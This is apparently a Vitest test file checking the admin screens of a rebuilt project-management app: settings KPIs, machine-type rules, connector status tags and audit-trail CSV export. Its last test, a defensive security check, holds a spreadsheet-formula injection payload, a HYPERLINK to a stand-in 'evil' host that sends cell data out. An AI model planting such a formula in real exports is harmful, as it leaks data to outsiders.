// Golden values reproduced from the prototype's own logic (Settings 4437–4445, Machine types 5083–5099, Activity &
// integrations 4692–4718 run in node:vm by scripts/proto-golden-admin.ts → src/features/admin/admin.golden.json,
// renderValsEN, director): KPI tiles, card metadata, location-type options, health text, machine-type list lines, use
// texts, payment-pattern totals, cost totals, form options, activity chips and icons, connector tags, and the effects of
// the in-screen edits. The rules the rebuild settles differently (singular forms, threshold validation, the site
// calendar option, connectors in error) are asserted explicitly.
import { describe, expect, it } from 'vitest';
import { money } from '@/lib/format';
import { connectorStatus, costType, type ActivityKind, type ConnectorStatus } from '@/server/db/codes';
import PROTO from '@/server/prototype/prototype-data.json';
import GEN from '@/server/prototype/prototype-generated.json';
import GOLDEN from '@/features/admin/admin.golden.json';
import {
  ACTIVITY_ICON, BLANK_MACHINE_TYPE, MT_CALENDAR_OPTIONS, MT_COST_TYPES, MT_FORM_BASES, MT_FORM_CALENDARS, NEW_COST_CATEGORY, NEW_ITP_SYSTEM, NEW_PHASE,
  PLUMB_VIEWS, SETTINGS_CARDS, activityChips, activityKindLabel, auditCsv, auditCsvFileName, connectorNeedsAttention, connectorTone, costCategoriesTotal,
  countText, healthRuleText, holidayEntry, isSettingsCardKey, locationTypeShortLabel, machineTypeKpis, machineTypeListSub, machineTypeUseText,
  normaliseMachineTypeCode, parseActivitySource, parseBudgetInput, parsePercentInput, parsePlumbView, parseThresholdInput, paymentTerms, plumbingKpis,
  settingsEntry, settingsKpis, thresholdText, thresholdsError, type MachineTypeFacts,
} from './admin';

/* eslint-disable @typescript-eslint/no-explicit-any */
const P = PROTO as any;
const G = GOLDEN as any;
const LO = 'var(--color-accent-300)';
const OK = 'var(--color-text)';
const kpis = (ks: any[]) => ks.map((k) => ({ ...k, value: String(k.value) }));

describe('Settings rules (settingsKpis / settingsCards / locTypeSeg / setHealth)', () => {
  const S = P.SETTINGS0;
  it('KPI tiles, health text and thresholds as the prototype prints them', () => {
    const input = { locationTypes: S.locations.map((l: string[]) => l[1]), skills: S.skills.length, costCats: S.costCats.length, holidays: S.holidays.length, health: S.health };
    expect(settingsKpis(input)).toEqual(kpis(G.en.settings.kpis));
    expect(healthRuleText(S.health)).toBe(G.en.settings.health.text);
    expect([thresholdText(S.health.risk), thresholdText(S.health.off)]).toEqual([G.en.settings.health.risk, G.en.settings.health.off]);
    // After edits: thresholds 0.95 / 0.85 and a location of a new type.
    expect(healthRuleText({ risk: 0.95, off: 0.85 })).toBe(G.settingsEdits.thresholds.health.text);
    expect(settingsKpis({ ...input, health: { risk: 0.95, off: 0.85 } })[3].value).toBe(G.settingsEdits.thresholds.kpis[3].value);
    expect(settingsKpis({ ...input, locationTypes: [...input.locationTypes, 'Workshop'] })[0]).toEqual({ ...G.settingsEdits.addLocationWorkshop.kpis[0], value: '7' });
    const removed = input.locationTypes.filter((_: string, i: number) => i !== 4);
    expect(settingsKpis({ ...input, locationTypes: removed })[0]).toEqual({ ...G.settingsEdits.removeLocation.kpis[0], value: '5' });
    expect(settingsKpis(input).every((k) => k.color === OK)).toBe(true);
  });

  it('card metadata, location-type options and the add-entry draft', () => {
    expect(SETTINGS_CARDS.map((c) => ({ key: c.key, title: c.title, sub: c.sub, icon: `ph ph-${c.icon}` }))).toEqual(
      G.en.settings.cards.map((c: any) => ({ key: c.key, title: c.title, sub: c.sub, icon: c.icon })),
    );
    expect(S.locTypes.map(locationTypeShortLabel)).toEqual(G.en.settings.locTypeSeg.map((o: any) => o.label));
    expect(isSettingsCardKey('holidays')).toBe(true);
    expect(isSettingsCardKey('locTypes')).toBe(false);
    // `add()`: the draft is trimmed; blank adds nothing (the skills card stays at 10 with the blank draft kept).
    expect(settingsEntry('  Welding  ')).toBe('Welding');
    expect(G.settingsEdits.addSkill.cards.find((c: any) => c.key === 'skills').items.at(-1).label).toBe('Welding');
    expect(settingsEntry('   ')).toBe('');
    expect(G.settingsEdits.addBlank.cards.find((c: any) => c.key === 'skills').count).toBe(10);
    expect(settingsEntry(42)).toBe('');
  });

  it('threshold inputs: parseFloat as the prototype; the rebuild validates the pair (10 OQ2)', () => {
    expect(parseThresholdInput('0.95')).toBe(0.95);
    expect(parseThresholdInput(' 0,85 ')).toBe(0.85);
    // The prototype keeps the previous value on NaN ("abc" → still 0.9).
    expect(parseThresholdInput('abc')).toBeNull();
    expect(G.settingsEdits.thresholdNaN.health.off).toBe('0.9');
    expect(parseThresholdInput(null)).toBeNull();
    expect(thresholdsError({ risk: 0.97, off: 0.9 })).toBeNull();
    expect(thresholdsError({ risk: 0.9, off: 0.9 })).toBe('"Off track below" must be lower than "At risk below"');
    expect(thresholdsError({ risk: 0.97, off: 0 })).toBe('Enter a threshold between 0 and 2');
    expect(thresholdsError({ risk: 3, off: 0.9 })).toBe('Enter a threshold between 0 and 2');
  });

  it('public holidays are stored with the English date; French dates typed in the French UI are converted', () => {
    expect(holidayEntry('26 Dec · Saint-Étienne')).toBe('26 Dec · Saint-Étienne');
    expect(G.settingsEdits.addHoliday.cards.find((c: any) => c.key === 'holidays').items.at(-1).label).toBe('26 Dec · Saint-Étienne');
    expect(holidayEntry(' 14 juil. · Fête nationale ')).toBe('14 Jul · Fête nationale');
    expect(holidayEntry('1 janvier · Jour de l’an')).toBe('1 Jan · Jour de l’an');
    expect(holidayEntry('08 mai · Victoire 1945')).toBe('8 May · Victoire 1945');
    expect(holidayEntry('Toussaint')).toBe('Toussaint');
  });
});

describe('Machine-type rules (MT_ALL / mtKpis / mtList / mtVals / AF.mtype)', () => {
  const mts: string[] = P.MACHINE_TYPES;
  const tpl = (code: string) => P.NP_TEMPLATES.find((x: any) => x.mt === code);
  const facts = (code: string, over: Partial<MachineTypeFacts> = {}): MachineTypeFacts => ({
    active: true, isStandard: true, phases: tpl(code).phases.length, itpSystems: P.ITP_TEMPLATES[code].length, rexReferences: P.REX_FIN[code].refs.length, ...over,
  });
  const projects = GEN.initialProjects as any[];
  const typed = projects.filter((p) => P.PROJ_ID[p.code]?.mt).length;

  it('KPI tiles (default, deactivated, references removed, custom types)', () => {
    expect(machineTypeKpis(mts.map((c) => facts(c)), typed, projects.length)).toEqual(kpis(G.en.mtypes.kpis));
    expect(machineTypeKpis(mts.map((c) => facts(c, c === 'EMP' ? { active: false } : {})), typed, projects.length)).toEqual(kpis(G.mtypeEdits.deactivate.kpis));
    expect(machineTypeKpis(mts.map((c) => facts(c, c === 'EMP' ? { rexReferences: 0 } : {})), typed, projects.length)).toEqual(kpis(G.mtypeEdits.removeRef.kpis));
    const memu = facts('MEMU');
    expect(machineTypeKpis([...mts.map((c) => facts(c)), { ...memu, isStandard: false, rexReferences: 0 }], typed, projects.length)).toEqual(kpis(G.mtypeEdits.createFromMemu.kpis));
    const blank = { active: true, isStandard: false, phases: BLANK_MACHINE_TYPE.phases.length, itpSystems: BLANK_MACHINE_TYPE.itpSystems.length, rexReferences: 0 };
    const k = machineTypeKpis([...mts.map((c) => facts(c)), blank], typed, projects.length);
    expect(k).toEqual(kpis(G.mtypeEdits.createBlank.kpis));
    expect(k[2].color).toBe(LO);
  });

  it('list lines, use texts and the singular forms the rebuild fixes ("1 ITP system")', () => {
    for (const m of G.en.mtypes.list) {
      const t = tpl(m.code);
      const sub = machineTypeListSub(t.phases.length, t.cats.length, P.ITP_TEMPLATES[m.code].length);
      // Deliberate: the prototype wrote "1 ITP systems" (AUTRE, R&D).
      expect(sub, m.code).toBe(m.sub.replace(/^(.*· )1 ITP systems$/, '$11 ITP system'));
    }
    expect(machineTypeListSub(1, 1, 2)).toBe('1 phase · 1 cost category · 2 ITP systems');
    expect(G.en.mtypes.list.map((m: any) => m.use)).toEqual(['1 project', '2 projects', '1 project', '1 project', '1 project']);
    expect([0, 1, 2].map(machineTypeUseText)).toEqual(['no project', '1 project', '2 projects']);
    expect(countText(3, 'phase', 'phases')).toBe('3 phases');
  });

  it('payment pattern totals, percentage and budget inputs, cost totals', () => {
    for (const [code, m] of Object.entries(G.en.mtypes.types) as [string, any][]) {
      const terms = paymentTerms(+m.dep, +m.deliv, +m.acc);
      expect([terms.text, terms.ok], code).toEqual([m.termsSum, m.termsOk]);
      const cats = m.cats.map((c: any) => ({ budgetKeur: parseBudgetInput(c.budget)! }));
      expect(money(costCategoriesTotal(cats), 'en'), code).toBe(m.catTotal);
    }
    // SPUR: deposit 25, delivery "x" → parseInt || 0 → 35 %, flagged.
    const t = G.mtypeEdits.terms.mt;
    expect([parsePercentInput('25'), parsePercentInput('x'), parsePercentInput(''), parsePercentInput(40.7)]).toEqual([25, 0, 0, 40]);
    expect(paymentTerms(parsePercentInput(t.dep), parsePercentInput(t.deliv), parsePercentInput(t.acc))).toEqual({ sum: 35, ok: false, text: t.termsSum });
    // EMP after removing "Études" and adding a 40.5 k€ Equipment category.
    const cats = G.mtypeEdits.cats.mt.cats;
    expect(money(costCategoriesTotal(cats.map((c: any) => ({ budgetKeur: parseBudgetInput(c.budget)! }))), 'en')).toBe(G.mtypeEdits.cats.mt.catTotal);
    expect(cats.at(-1)).toMatchObject({ name: NEW_COST_CATEGORY.name, budget: '40.5' });
    expect([parseBudgetInput('abc'), parseBudgetInput('12,5'), parseBudgetInput('')]).toEqual([null, 12.5, null]);
    expect(money(costCategoriesTotal([]), 'en')).toBe(G.mtypeEdits.createBlank.mt.catTotal);
  });

  it('defaults of the add buttons, the Blank template and the code rule of "New machine type"', () => {
    expect(G.mtypeEdits.phases.mt.phases.at(-1).name).toBe(NEW_PHASE);
    expect(G.mtypeEdits.itp.mt.itp).toEqual([NEW_ITP_SYSTEM]);
    expect(costType.label(NEW_COST_CATEGORY.type)).toBe('Labor');
    const blank = G.mtypeEdits.createBlank.mt;
    expect({ phases: blank.phases, itp: blank.itp, dep: +blank.dep, deliv: +blank.deliv, acc: +blank.acc }).toEqual({
      phases: BLANK_MACHINE_TYPE.phases, itp: BLANK_MACHINE_TYPE.itpSystems, dep: BLANK_MACHINE_TYPE.depositPct, deliv: BLANK_MACHINE_TYPE.deliveryPct, acc: BLANK_MACHINE_TYPE.acceptancePct,
    });
    expect(normaliseMachineTypeCode(' new type ')).toBe(G.mtypeEdits.createFromMemu.mtSel);
    expect(normaliseMachineTypeCode('lab')).toBe(G.mtypeEdits.createBlank.mtSel);
    expect(normaliseMachineTypeCode('emp')).toBe('EMP');
    expect(G.mtypeEdits.createDuplicate.toast).toBe('Code already used');
  });

  it('options of the identity card, the cost categories and AF.mtype', () => {
    const emp = G.en.mtypes.types.EMP;
    expect(MT_CALENDAR_OPTIONS.map((o) => o.label)).toEqual(emp.calOpts.map((o: any) => o.v));
    // Deliberate (E-9): SPUR's "Chantier 6d · 10h" is the site calendar, offered as "Site 6d · 10h" and selected.
    expect(G.en.mtypes.types.SPUR.calOpts.some((o: any) => o.selected)).toBe(false);
    expect(MT_CALENDAR_OPTIONS.find((o) => o.label === 'Site 6d · 10h')!.value).toBe('site_6x10');
    expect(MT_COST_TYPES.map((c) => costType.label(c))).toEqual(emp.cats[0].typeOpts);
    const form = G.en.forms.mtype;
    expect(form.fields.map((f: any) => [f.id, f.label, f.req, f.type])).toEqual([
      ['code', 'Code', true, 'text'], ['label', 'Label', true, 'text'], ['base', 'Copy template from', false, 'select'], ['cal', 'Default calendar', false, 'select'],
      ['desc', 'Description', false, 'textarea'],
    ]);
    expect(MT_FORM_BASES.map((o) => o.label)).toEqual(form.fields[2].options);
    expect(MT_FORM_CALENDARS.map((o) => o.label)).toEqual(form.fields[3].options);
    expect(MT_FORM_BASES.map((o) => o.value)).toEqual(['EMP', 'MEMU', 'SPUR', 'AUTRE', 'rnd', 'blank']);
  });
});

describe('Activity & integrations rules (plumbKpis / actChips / actRows / connRows)', () => {
  const kinds = (P.ACTIVITY as string[][]).map((a) => a[3] as ActivityKind);
  const statuses = (P.CONNECTORS as string[][]).map((c) => connectorStatus.code(c[3]));

  it('KPI tiles per persona', () => {
    for (const [role, unread, title] of [['director', 3, 'Portfolio director'], ['pm', 4, 'Project manager']] as const) {
      expect(plumbingKpis({ eventsToday: 6, connectorStatuses: statuses, unread, personaTitle: title, auditEntries: P.AUDIT.length })).toEqual(kpis(G.en.plumbing.kpisByRole[role]));
    }
    // Deliberate: Vigie is the 10th connector; a connector in error counts with the warnings.
    const k = plumbingKpis({ eventsToday: 0, connectorStatuses: [...statuses, 'ok', 'error'] as ConnectorStatus[], unread: 0, personaTitle: 'x', auditEntries: 0 });
    expect(k[1]).toEqual({ label: 'Connectors', value: '11', sub: '8 healthy · 2 warning', color: LO });
    expect(k[2].color).toBe(OK);
    expect(plumbingKpis({ eventsToday: 0, connectorStatuses: ['ok', 'ready'], unread: 0, personaTitle: 'x', auditEntries: 0 })[1]).toMatchObject({ sub: '1 healthy · 0 warning', color: OK });
  });

  it('display options, source chips, row icons and filters', () => {
    expect(PLUMB_VIEWS.map((v) => v.label)).toEqual(G.en.plumbing.seg.map((o: any) => o.label));
    expect(activityChips(kinds).map((c) => [c.label, String(c.count)])).toEqual(G.en.plumbing.chips.map((c: any) => [c.label, c.count]));
    expect(activityChips(kinds)[0].value).toBeNull();
    expect(activityChips([])).toEqual([{ value: null, label: 'All', count: 0 }]);
    expect(G.en.plumbing.actRows.map((a: any) => `ph ph-${ACTIVITY_ICON[a.kind as ActivityKind]}`)).toEqual(G.en.plumbing.actRows.map((a: any) => a.icon));
    expect(activityKindLabel('eco')).toBe('Eco');
    for (const [k, g] of Object.entries(G.en.plumbing.byKind) as [string, any][]) {
      expect((P.ACTIVITY as string[][]).filter((a) => a[3] === k).map((a) => a[2])).toEqual(g.rows);
    }
    expect([parsePlumbView('audit'), parsePlumbView('nope'), parsePlumbView(undefined)]).toEqual(['audit', 'activity', 'activity']);
    expect([parseActivitySource('stock', kinds), parseActivitySource('nope', kinds), parseActivitySource('stock', [])]).toEqual(['stock', null, null]);
  });

  it('connector status tags', () => {
    expect(G.en.plumbing.connRows.map((c: any) => `tag tag-${connectorTone(connectorStatus.code(c.st))}`)).toEqual(G.en.plumbing.connRows.map((c: any) => c.tagClass));
    expect([connectorTone('error'), connectorNeedsAttention('error'), connectorNeedsAttention('ready')]).toEqual(['accent', true, false]);
  });

  it('audit trail CSV (ISO 9001): header, newest first as given, RFC 4180 quoting, ISO timestamps', () => {
    const csv = auditCsv([
      { occurredAt: '2026-09-25T07:12:00.000Z', who: 'Romain Aubert', object: 'CR-008', change: 'status: Draft → In review', area: 'Change control', projectCode: 'HLT-026' },
      { occurredAt: '2026-09-24T15:30:00.000Z', who: 'Léa Marchand', object: 'Rate card', change: 'base: 82 → 85 €/h, "senior"', area: 'Settings', projectCode: null },
    ]);
    expect(csv.split('\r\n')).toEqual([
      'When (UTC),Who,Object,Change,Area,Project',
      '2026-09-25T07:12:00.000Z,Romain Aubert,CR-008,status: Draft → In review,Change control,HLT-026',
      '2026-09-24T15:30:00.000Z,Léa Marchand,Rate card,"base: 82 → 85 €/h, ""senior""",Settings,',
      '',
    ]);
    expect(auditCsv([], ['Quand (UTC)', 'Qui', 'Objet', 'Modification', 'Domaine', 'Projet'])).toBe('Quand (UTC),Qui,Objet,Modification,Domaine,Projet\r\n');
    expect(auditCsvFileName('2026-10-09')).toBe('keystone-audit-trail-2026-10-09.csv');
    // Security review: a value a spreadsheet would run as a formula is neutralised with a leading quote.
    const evil = auditCsv([{ occurredAt: '2026-09-25T07:12:00.000Z', who: '@x', object: '=HYPERLINK("https://evil/?d="&A2,"x")', change: '+1', area: '-2', projectCode: null }]);
    expect(evil.split('\r\n')[1]).toBe(`2026-09-25T07:12:00.000Z,'@x,"'=HYPERLINK(""https://evil/?d=""&A2,""x"")",'+1,'-2,`);
  });
});
